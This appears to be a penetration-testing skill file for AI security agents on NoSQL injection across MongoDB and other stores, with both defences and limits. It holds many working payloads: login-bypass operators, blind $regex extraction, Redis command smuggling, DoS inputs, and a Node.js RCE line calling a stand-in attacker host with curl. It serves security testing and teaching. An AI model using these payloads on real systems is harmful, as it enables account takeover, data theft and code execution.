---
name: nosql-injection
description: NoSQL injection testing — MongoDB operator injection, $where/$function/$expr JavaScript surfaces, aggregation-pipeline injection, blind extraction, GraphQL variable injection, and Redis/DynamoDB/Elasticsearch/CouchDB/Neo4j/Cassandra store-specific attack surfaces
---

# NoSQL Injection

NoSQL injection exploits the mismatch between how applications pass user input to database queries and how the database engine interprets that input. Unlike SQL injection, NoSQL injection frequently involves **operator injection** — embedding operators such as `$ne`, `$gt`, `$regex`, `$where` into structured query objects — or **structure injection** (embedding JSON sub-documents that change query shape). PortSwigger's canonical taxonomy names these two categories: **syntax injection** (breaking NoSQL query syntax analogously to classical SQLi) and **operator injection** (manipulating queries via NoSQL operators). MongoDB is the dominant target; Redis, Elasticsearch, DynamoDB, Cassandra, CouchDB, and Neo4j each carry distinct injection surfaces. GraphQL resolvers passing variables directly into a backing NoSQL filter are a frequent cross-cutting vector.

## Attack Surface

**Input shapes that reach query filters**
- JSON body parameters parsed straight into query objects
- Form fields with bracket notation (`field[$ne]=`) coerced into operator objects by Express, PHP, and similar middleware
- URL-encoded JSON in query strings, headers, and cookies
- GraphQL variables passed directly into resolver-level NoSQL filters

**Code patterns that enable injection**
- Raw filter dicts/objects from user input handed to `find`/`findOne`/`aggregate`
- String concatenation into Cypher / CQL / Redis commands instead of the driver's parameterized form
- ODM passthrough: Mongoose `{strict: false}`, Morphia raw `where()`, PyMongo `find()` with unsanitized JSON dicts (legacy `eval()` is fatal)
- Server-side JavaScript surfaces: `$where`, `$function`, `$accumulator`, CouchDB `_design` views
- Application-side query evaluation via libraries like `sift` that honor `$where` **without** MongoDB's server-side sandbox — see § Application-Side Evaluation below

**Stores in scope**
MongoDB (primary), Redis, Elasticsearch, DynamoDB, Cassandra, CouchDB, Neo4j. Couchbase / DocumentDB / HBase / ScyllaDB / Memcached follow the same operator-injection or command-smuggling models — DocumentDB in particular accepts MongoDB payloads unchanged.

## High-Value Targets

- Login and authentication endpoints (username/password fields)
- Search and filter APIs (catalog, user search, admin lookup)
- Password reset and token lookup flows
- Admin queries filtering by role, plan, or privilege fields
- Endpoints accepting raw JSON objects as query parameters
- ODM/framework endpoints that lift request body directly into query builders (Mongoose `populate().match`, Sequelize `where`, TypeORM `find(options)`)

## Reconnaissance

### Content-Type and Input Shape

- Identify endpoints accepting `application/json` — these can receive operator objects directly
- Identify endpoints accepting `application/x-www-form-urlencoded` — bracket notation `username[$ne]=x` maps to `{username: {$ne: 'x'}}` in many frameworks (Express `body-parser`, PHP)
- Determine whether the backend uses Mongoose, native MongoDB driver, or a REST ODM wrapper

### Error Fingerprinting

- Send malformed JSON: `{"username": {"$gt": ""}}`
- Send bracket notation in form data: `username[$gt]=`
- Look for MongoDB error messages: `MongoError`, `CastError`, `ValidationError`
- Stack traces revealing collection names, field names, driver version

### OWASP WSTG Probe Set

OWASP WSTG v4.2 (current edition, § 4.7.5.6 Testing for NoSQL Injection) prescribes the special-character probe set `' " \ ; { }` — send these unsanitized to a suspected sink and watch for a database error as confirmation. The character set is MongoDB-scoped but placed inside the general WSTG NoSQLi chapter as the recommended How-to-Test starting point.

### Operator Probe

Test whether operators pass through to the database:
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```
If authentication succeeds or response differs, operator injection is confirmed.

## Key Vulnerabilities

### MongoDB Authentication Bypass

The classic operator injection against login queries of the form `db.users.findOne({username: input.username, password: input.password})`:

**JSON body injection:**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```
Matches the first document where both fields are non-null — typically the first user/admin.

**Form body (bracket notation):**
```
username[$ne]=invalid&password[$ne]=invalid
```

**Variations:**
```json
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$gt": ""}}
{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$gt": ""}}
```

### Blind Data Extraction via `$regex`

When the query result is not directly reflected but observable (boolean response, redirect, timing), extract field values character by character using `$regex`:
```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^b"}}
...
```
Binary search the character space to minimize requests. Works on any string field (token, reset code, API key).

### `$where` JavaScript Injection

Primitive: MongoDB's `$where` operator evaluates a JavaScript expression server-side per document. OWASP WSTG v4.2 contrasts it explicitly with SQL: "*because JavaScript is a fully featured language, not only does this allow an attacker to manipulate data, but also to run arbitrary code*." If `$where` is enabled (disabled by default in MongoDB 7.0+; MongoDB 4.4–6.x deprecated it but left `javascriptEnabled` defaulting to `true`), inject arbitrary server-side JavaScript:
```json
{"$where": "function(){return this.role == 'admin'}"}                          // direct filter — returns matching documents
{"$where": "function(){return this.username == 'admin' && sleep(2000)}"}       // timing oracle only — sleep() returns undefined (falsy), so no documents are returned; observe latency
```

**sleep() falsy nuance (preserve — measured behavior).** MongoDB's `sleep()` command returns a falsy value (`undefined`) that breaks naive boolean-based blind chains — a payload that only calls `sleep()` returns no documents. The correct shape for a timing oracle is either:
- Pure timing (observe latency, ignore result-set count): `{$where: "sleep(5000)"}` — 5-second delay confirms injection, response set is empty.
- Timing + truthy predicate: `sleep(2000) || true` — matches all documents AND induces the delay.

The Rocket.Chat CVE-2023-28359 PoC uses the `sleep(2000)||true` production shape for exactly this reason.

**PortSwigger canonical character-by-character extraction shape:**
```
admin' && this.password[0] == 'a' || 'a'=='b
```
Evaluated server-side as a boolean; iterate through candidate characters, observe result-set differential.

**MongoDB 8.0 $where sandbox.** Recent MongoDB versions restrict `$where` to a sandbox that blocks `db`, filesystem, network, and XHR primitives. The primitive is still JavaScript evaluation but the reachable capability is narrower — see `nosql_injection_novel_deep.md § MongoDB 8.0 $where Sandbox — What Blocks and What Allows` for the mechanism decomposition.

### `$function` and `$accumulator` (MongoDB 4.4+)

Server-side JavaScript in aggregations. `$function` must live inside an expression context — `$expr`, `$project`, `$addFields`, etc. — not as a top-level filter:
```json
{"$expr": {"$function": {"body": "function(doc){return doc.role == 'admin'}", "args": ["$$ROOT"], "lang": "js"}}}
```
Gated by the same `javascriptEnabled` parameter as `$where`, but reachable through aggregation endpoints — useful when `$where` is filtered at the query layer but aggregation pipelines remain user-influenceable.

### Aggregation Pipeline Injection

`$match`, `$lookup`, and `$project` stages accept the same operator payloads as `find()`. User-controlled `$lookup.from` is the highest-impact variant — it can pivot the query to a different collection (e.g., from `orders` into `users`) and exfiltrate cross-tenant data. Load `nosql_injection_advanced_deep.md § Aggregation Pipeline Depth` for the multi-stage pivot depth.

### Application-Side Evaluation ($where Interpreted by sift, Not by MongoDB)

A distinct and higher-impact class: some ODMs and query frameworks evaluate query operators **client-side** (in the application's Node.js process) rather than sending the operator to the DB. The client-side evaluator honors `$where` but does NOT apply MongoDB's server-side JavaScript sandbox — operator injection then escalates from database-scoped extraction to **arbitrary JavaScript execution in the application's Node.js process**.

The canonical case: Mongoose's `populate().match` filter is evaluated by the `sift` library at the application layer. On unpatched Mongoose branches (see the canonical version/fix table in the novel sibling), this becomes Node.js RCE via `$where` injection. Two CVEs cover the class:
- **CVE-2024-53900** — direct `$where` in `populate().match`. Route: `nosql_injection_novel_deep.md § Mongoose $where RCE Chain — CVE-2024-53900 and CVE-2025-23061`.
- **CVE-2025-23061** — bypass of the CVE-2024-53900 fix via `$where` nested under `$or`/`$and`. Same route.

The distinction matters for scoping: server-side $where restricted to MongoDB 8.0's sandbox is a lower-impact primitive; application-side $where evaluated by `sift` (or a similar library) is a Node.js RCE primitive.

### Redis Command Injection

When Redis commands are constructed by string concatenation:
```python
redis.execute_command(f"SET {user_key} {value}")
```
Inject newline characters (`\r\n`) to inject additional Redis commands (RESP protocol injection):
```
key\r\nSET backdoor attacker_controlled\r\nSET dummy
```

### Elasticsearch Query String Injection

`query_string` and `simple_query_string` accept Lucene syntax. User input flowing directly:
```
q=normal+search            →   normal results
q=*                        →   all documents
q=role:admin               →   filter by field
q=_exists_:password_hash   →   existence probe
```

For Painless script injection via `_update`:
```json
{"script": {"source": "ctx._source.role = params.r", "params": {"r": "admin"}}}
```
If the `source` field is user-controlled, inject arbitrary Painless.

### DynamoDB FilterExpression Injection

PartiQL injection allows expansion of intended queries:
```sql
-- Intended:
SELECT * FROM Users WHERE username = 'input'

-- Injected:
SELECT * FROM Users WHERE username = 'x' OR '1'='1
```

### Cassandra CQL Injection

CQL is SQL-shaped, so injection follows the SQL pattern when input is concatenated instead of bound via `session.prepare()`:

```
username: ' OR '1'='1' ALLOW FILTERING --
username: 'x' OR token(username) > token('a') ALLOW FILTERING --
```

No `SLEEP` or OOB primitive natively — detection is boolean/error-based only.

### CouchDB Mango and View Injection

Mango selectors on `_find` accept operator payloads in the same shape as MongoDB:
```json
POST /db/_find  { "selector": {"username": "admin", "password": {"$gt": ""}} }
POST /db/_find  { "selector": {"role": {"$regex": "^admin"}} }
```

`_design` document injection — if user input flows into a design doc's `views.<name>.map`, the JavaScript runs server-side in the Couch sandbox on every view query:
```json
{"views": {"x": {"map": "function(doc){ emit(doc._id, doc) }"}}}
```

Also probe `_all_docs?include_docs=true` for unscoped enumeration and check for admin-party misconfigurations (`_users/_all_docs` reachable without auth) before payload work.

### Neo4j Cypher Injection

When user input is concatenated into Cypher rather than passed as a parameter (`$param`):
```python
# Vulnerable
session.run(f"MATCH (u:User {{name: '{name}'}}) RETURN u")

# Injected: name = x'}) RETURN u UNION MATCH (u:User) RETURN u //
```

**APOC abuse** (when `apoc.*` procedures are enabled via `dbms.security.procedures.unrestricted`):
- `CALL apoc.load.json('http://attacker/x')` — SSRF and external data fetch
- `CALL apoc.cypher.run("...", {})` — dynamic query execution from a string
- `CALL dbms.security.listUsers()` — user enumeration on misconfigured Community Edition

### GraphQL Variable Injection

Resolvers passing variables straight into a backing NoSQL filter are a common chained vector:
```graphql
query Login($input: UserFilter!) {
  user(filter: $input) { id role }
}
```
With `$input` reaching `db.users.findOne(input)`, send:
```json
{"input": {"username": "admin", "password": {"$ne": ""}}}
```
Use introspection (`__schema`, `__type`) to enumerate which input types accept arbitrary objects — those are the operator-injection candidates.

### Server-Side JavaScript Detection and DoS

Fingerprint SSJS state before investing in `$where` / `$function` payloads:
```javascript
db.adminCommand({getParameter: 1, javascriptEnabled: 1})
```

DoS surface (use only with explicit authorization scope):
- **ReDoS**: `{"field": {"$regex": "^(a+)+$"}}` against long values triggers catastrophic backtracking
- **Large `$in` arrays**: thousands of values force linear scans on unindexed fields
- **Infinite `$where` loops**: `{"$where": "while(true){}"}` if SSJS is enabled without query timeouts
- **Heavy aggregations**: chained `$lookup` across large unindexed collections

## Bypass Techniques

**Type Coercion**
- Send operators as arrays: `{"$gt": [""]}` — some drivers coerce arrays
- Mix string and object types in the same request to trigger parser branches

**Encoding**
- URL-encode brackets: `username%5B%24ne%5D=x` → `username[$ne]=x`
- Double-encode for WAFs sitting in front of JSON-parsing backends

**Operator Alternatives**
- `$nin` (not in), `$exists: false`, `$type` — alternative operators that reach the same result when `$ne` is filtered
- `$not` wrapping another operator: `{"field": {"$not": {"$eq": "value"}}}`
- `$expr` with `$ne` for complex comparisons: `{"$expr": {"$ne": ["$password", "wrong"]}}`

**Structure Manipulation**
- Dotted-key vs nested object: `{"a.b": "c"}` vs `{"a": {"b": "c"}}` — sanitizers often strip one form but pass the other
- Array vs object operator wrapping: some parsers treat `["$or", ...]` as operator arrays
- Prototype pollution: `__proto__` and `constructor.prototype` keys in JSON bodies polluting Object prototypes consumed downstream by query builders — load `prototype_pollution.md` for the intersection
- `$regex` case-insensitive flag (`"$options": "i"`) widens matches that case-sensitive filters miss

**Nested Operator Bypass of Top-Level Filters**
- Sanitizers/guards that check only top-level keys miss `$where` (or other operators) nested inside `$or`, `$and`, or `$nor`. The Mongoose CVE-2025-23061 mechanism is exactly this class — the CVE-2024-53900 fix guarded top-level properties only, so `{$or: [{$where: "..."}]}` bypassed it. Load `nosql_injection_novel_deep.md § Mongoose $where RCE Chain` for the anatomy.

## Defenses and Their Limits

### express-mongo-sanitize — the canonical Node middleware

`express-mongo-sanitize` (fiznool) strips or replaces object keys that start with `$` or contain `.` because both are reserved by MongoDB as operator/nesting syntax. Effective against direct operator injection in JSON bodies and bracket-notation form data.

**Known limitations to preserve in guidance (not overreach):**
1. **Key-based filtering does NOT stop value-side JS payloads.** A `$where`-string value that was already parsed as a string reaches the driver unchanged.
2. **It does not protect if the driver has already lifted the JSON body into nested operator objects before the middleware runs** — middleware ordering matters.
3. **Express 5 makes `req.query` read-only,** breaking the in-place mutation contract that older versions relied on; a middleware that assumed writable req.query silently fails on Express 5.
4. **Sanitizer does not cover ODM-lifted paths** — if Mongoose's populate().match evaluates operators application-side via `sift`, the sanitizer's DB-layer scope doesn't reach that code path.

### OWASP Cheat Sheet — UNSAFE vs SAFE patterns

OWASP publishes both a canonical UNSAFE pattern (string-concatenated MongoDB filter fed to `eval()`) and a canonical SAFE pattern (pass a plain JavaScript object filter directly to the driver's `find()`). The safe pattern is a mitigation of `eval()`+string-concat, but it does NOT by itself defeat operator injection — an attacker with `?name[$ne]=null` via Express's `qs` parser still produces an operator filter object that reaches `find()`.

### Schema Validation and Strict Typing

- Mongoose `{strict: 'throw'}` rejects fields not in the schema (blocks structure injection of unexpected fields; does NOT block operators on schema-valid fields).
- MongoDB collection-level JSON Schema validators enforce document shape at write; do not defend against query-time operator injection.
- Type-cast filter fields to their expected schema type at the application layer BEFORE constructing the query (`String(input.username)` coerces an operator object to `"[object Object]"` which will not match).

## Testing Methodology

1. **Identify query-receiving endpoints** — login, search, filter, lookup
2. **Determine input format** — JSON body vs form fields vs URL params
3. **Send OWASP WSTG v4.2 probe set** — `' " \ ; { }`; watch for MongoDB/driver errors
4. **Attempt operator injection** — `$ne`, `$gt`, `$regex` against login endpoint
5. **Confirm boolean oracle** — response, status, redirect differs between true/false predicates
6. **Extract data blindly** — character-by-character `$regex` on sensitive fields (token, reset code)
7. **Test `$where`** — if enabled (probe with `db.adminCommand`), attempt JavaScript sleep-based timing with the sleep()-falsy-safe shape (`sleep(2000) || true`)
8. **Probe aggregation endpoints** — inject operators into `filter`/`match`/`sort` fields; test `$expr`+`$function` if aggregations are user-influenceable
9. **Test non-MongoDB stores** — Elasticsearch `query_string`, Redis command construction, DynamoDB PartiQL, CouchDB Mango selectors, Neo4j Cypher concatenation, Cassandra CQL
10. **Test GraphQL resolvers** — submit operator objects via variables on any input type that reaches a NoSQL filter; use `__schema` introspection to enumerate candidates
11. **Test populate().match / ODM-lifted paths on Mongoose** — the application-side evaluation class (sift-driven $where) is Node.js RCE, not just data extraction

## Validation

1. Demonstrate authentication bypass: send operator payload, confirm login succeeds for any/first account
2. Extract a verifiable secret (password hash, reset token, API key) via `$regex` blind extraction
3. Show at least two distinct operator payloads working to rule out coincidence
4. Provide before/after: normal request returns 401, injected request returns 200
5. For `$where`: show timing differential with the sleep()-falsy-safe shape (`sleep(5000)` alone for pure-timing; `sleep(5000)||true` for timing+truthy)
6. For application-side eval (Mongoose $where): confirm Node.js code execution via out-of-band callback (`this.constructor.constructor("return process")().mainModule.require("child_process").execSync("curl attacker.tld/${payload}")` or similar)

## False Positives

- Framework-level query builder that casts input to string before constructing the query (Mongoose `strict` mode on with type casting)
- Input sanitization stripping operator keys before they reach the driver
- Endpoints that accept JSON but cast the `password` field to string — operator object becomes `[object Object]`
- Response differences caused by validation errors, not actual operator execution
- `$where`-visible-in-error but rejected at the driver layer — MongoDB server error is not the same as query execution
- MongoBleed (CVE-2025-14847) is NOT a NoSQLi primitive — it is a zlib-compression-layer memory-disclosure flaw. Do not report as injection. Similarly CVE-2025-37727 (Elasticsearch reindex-audit-log) is CWE-532 (log-file information disclosure), not an OOB extraction primitive. See `nosql_injection_novel_deep.md § Explicit Non-Scope — CVEs That Are NOT NoSQLi`.

## Confirmation Discipline

Three separate states, often confused:
- **Operator echoed** — request contains `{$ne: null}` and the response contains `"$ne"` in an echoed dump of the request body. Proves the parser preserved the operator syntax; proves **nothing** about the query executing with the operator.
- **Operator executed** — an injected operator changes query result-set (auth bypass returns 200 where 401 was expected, `$regex ^a` matches a known-a-starting record). This is the injection proof.
- **Impact demonstrated** — a specific secret is extracted, or code executes (application-side eval class). This is the impact proof.

Report all three separately when they differ. An operator that reaches the driver but is stripped by schema casting is "operator reached, not executed"; not the finding.

## Chains

**Upstream (what grants operator injection):**
- JSON body parser preserving operator keys (default in Express, Fastify without schema, Koa).
- Query-string parser accepting bracket notation (`qs` with default `parseArrays: true`).
- ODM/framework passing user input to `find`/`findOne`/`aggregate` without operator-key filtering.
- Missing express-mongo-sanitize or a bypassed sanitizer (§ Defenses and Their Limits).

**Downstream (what operator injection grants):**
- **Authentication bypass** → session/token → any authenticated API. Route: `authentication_jwt.md` for token-based sessions.
- **Blind data extraction** → sensitive field disclosure (password hashes, reset tokens, API keys) via `$regex` character-by-character. Route: `authentication_jwt.md` if extracted secret is a signing key.
- **Application-side $where (Mongoose sift)** → **Node.js RCE**. Route: `rce.md`.
- **Server-side $where on old MongoDB** → in-DB code execution scoped to $where sandbox capabilities. Route: `rce.md` when reaching a spawn primitive within reach.
- **Aggregation $lookup pivot** → cross-collection reads / cross-tenant data disclosure. Route: `idor.md` for the authorization angle.
- **GraphQL introspection → operator injection** → data extraction across every introspection-discovered resolver. Route: `authentication_jwt.md` / `broken_function_level_authorization.md` for the resolver-authorization angle.

**Composite chains, end-to-end:**
- *Login-form NoSQLi → auth bypass → admin API → IDOR/BFLA cascade:* JSON body `{"username": {"$gt": ""}, "password": {"$gt": ""}}` returns first-user session (typically admin) → admin API tokens accessible → cascade into IDOR/BFLA across the admin surface. Route: `idor.md` / `broken_function_level_authorization.md`.
- *populate().match RCE on Mongoose:* JSON body with `{$or: [{$where: "malicious JS"}]}` reaches Mongoose populate → sift evaluates $where in Node.js → RCE. Route: `nosql_injection_novel_deep.md § Mongoose $where RCE Chain`.
- *GraphQL variable → NoSQLi → data exfil:* GraphQL query with `input: {"$or": [{}]}` variable → resolver merges into MongoDB find → all-records return → data exfil. Route: `nosql_injection_advanced_deep.md § GraphQL Variable Injection Depth`.
- *Elasticsearch script query → painless RCE:* if _search accepts user-controlled `script.source`, painless script executes; can reach the JVM's script sandbox limits. Route: `rce.md`.

Chain hops are reachability/enablement only; each hop's actual firing depends on the target's configuration and version.

## Impact

- Authentication bypass granting access to arbitrary or all accounts
- Full extraction of sensitive fields (tokens, hashed passwords, PII) via blind regex enumeration
- Privilege escalation by querying admin/superuser records directly
- Data exfiltration at scale via widened `$ne`/`$regex`/`$gt` filters
- Server-side JavaScript execution via `$where` on unpatched MongoDB instances
- **Node.js RCE via application-side $where evaluation** (Mongoose sift class) — the highest-impact primitive; leaves the application host, not just the database

## Pro Tips

1. Always try both JSON body (`{"field": {"$ne": null}}`) and bracket-notation form (`field[$ne]=`) — different middleware handles them differently
2. Target reset token and API key fields with `$regex` extraction, not just passwords
3. Check MongoDB version via error messages or `/admin/serverStatus`; `$where` is active by default on pre-7.0 instances — that includes 4.4–6.x targets where `javascriptEnabled` was deprecated but not yet disabled, making them still exploitable unless explicitly hardened
4. For Elasticsearch, try `_cat/indices`, `_mapping`, and `_search` with `query_string: *` before attempting script injection
5. Combine authentication bypass with a second request to `/admin` or `/api/users` to escalate impact
6. Automate `$regex` extraction with binary search: 7 requests per character vs 94 with linear search
7. GraphQL resolvers are an underexplored entry point — try operator objects in any input type that reaches a NoSQL filter, and use introspection to find candidate fields
8. When the target is a Node/Mongoose app, probe `populate().match` reachable endpoints for `$where` payloads — the primitive is application-side eval, not database-scoped
9. Use the sleep()-falsy-safe shape for MongoDB timing oracles (`sleep(N)||true`); a naive `{$where: "sleep(N)"}` returns no documents due to `sleep()` returning `undefined`
10. Match the target against `nosql_injection_novel_deep.md`'s current CVE version table before payload work — the Mongoose chain (CVE-2024-53900 → CVE-2025-23061) affects most 8.x/7.x/6.x/5.x branches through late 2025

## Tooling

- **NoSQLMap** — a NoSQL scanner focused on MongoDB / Couch; useful for the operator-injection auth-bypass class but does not exercise the application-side-eval RCE surface.
- **nuclei** (preinstalled) — has NoSQLi templates for quick triage: `nuclei -u https://target -tags nosqli`
- **ffuf / wfuzz** — for the character-by-character `$regex` extraction; parameterize the character axis and observe response differential.
- **agent-browser** (sandbox) — for GraphQL introspection + operator-injection variable submission; drive an authenticated session to enumerate operator-reachable resolvers.
- **Custom scripts** — most impactful NoSQLi work is bespoke (binary-search `$regex` extraction, ODM-specific reachability probes); the payload catalog above is the bulk of what a scanner would provide anyway.

## Summary

NoSQL injection exploits the same root cause as SQL injection — user input controlling query structure — but through operator embedding rather than syntax breaking. MongoDB is the primary target; enforce schema validation, use parameterized equivalents (strict mode with type casting, typed schemas), match ODM path reachability against the current Mongoose CVE chain before treating the target as safe, and never pass raw user input as a query object. The class's highest-impact primitive is application-side `$where` evaluated by client-side libraries like `sift` — this escalates to Node.js RCE, not just data extraction, so ODM-lifted match filters deserve their own probe pass.
